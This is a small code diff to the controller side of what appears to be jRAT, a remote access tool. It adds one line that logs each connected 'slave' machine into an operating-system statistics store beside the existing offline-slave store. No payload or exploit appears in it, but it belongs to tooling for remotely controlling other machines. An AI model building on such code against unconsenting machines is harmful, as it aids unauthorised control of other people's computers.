@@ -18,6 +18,7 @@ import se.jrat.client.events.Event;
 import se.jrat.client.events.Events;
 import se.jrat.client.packets.outgoing.Packet101TransferPlugin;
 import se.jrat.client.settings.Settings;
+import se.jrat.client.settings.StatisticsOperatingSystem;
 import se.jrat.client.settings.StoreOfflineSlaves;
 
 public class Packet3Initialized extends AbstractIncomingPacket {
@@ -29,6 +30,7 @@ public class Packet3Initialized extends AbstractIncomingPacket {
 		}
 		
 		StoreOfflineSlaves.getGlobal().add(new OfflineSlave(slave));
+		StatisticsOperatingSystem.getGlobal().add(slave);
 
 		List<String> plugins = new ArrayList<String>(Arrays.asList(slave.getPlugins()));
 		List<String> notInstalled = new ArrayList<String>();
